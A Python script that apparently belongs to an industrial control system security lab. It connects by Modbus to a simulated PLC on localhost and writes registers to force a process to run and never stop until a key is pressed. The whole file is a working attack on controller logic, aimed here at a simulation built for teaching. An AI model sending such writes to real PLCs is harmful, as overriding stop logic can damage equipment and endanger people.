#!/usr/bin/env python3

#########################################
# Imports
#########################################

import logging
import time
import os
import sys
import json
import threading
import contextlib 

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

with open(os.devnull, 'w') as fnull, contextlib.redirect_stdout(fnull), contextlib.redirect_stderr(fnull):
    from world import (
        PLC_RW_ADDR,
        PLC_TAG_RUN,
        PLC_TAG_NOZZLE,
        PLC_TAG_NEVER_STOP
    )

from modbus import ClientModbus as Client
from modbus import ConnectionException

# Logging
logging.basicConfig()
log = logging.getLogger()
log.setLevel(logging.INFO)

PORTS_FILE = os.path.join(os.path.dirname(__file__), '..', 'ports.json')
PORTS_FILE = os.path.abspath(PORTS_FILE)

while not os.path.exists(PORTS_FILE):
    print("En attente de world.py...")
    time.sleep(1)

with open(PORTS_FILE, "r") as f:
    ports = json.load(f)

client = Client("localhost", port=ports["plc"])

stop_attack = False

def listen_for_enter():
    input("")
    global stop_attack
    stop_attack = True

try:
    client.connect()

    listener_thread = threading.Thread(target=listen_for_enter)
    listener_thread.daemon = True
    listener_thread.start()

    client.write(PLC_RW_ADDR + PLC_TAG_RUN, 1)
    client.write(PLC_RW_ADDR + PLC_TAG_NEVER_STOP, 2)

    while not stop_attack:
        time.sleep(0.5)

    client.write(PLC_RW_ADDR + PLC_TAG_NEVER_STOP, 0)
    client.write(PLC_RW_ADDR + PLC_TAG_RUN, 1)

except Exception as e:
    log.error(f"Erreur de connexion ou d'écriture : {e}")
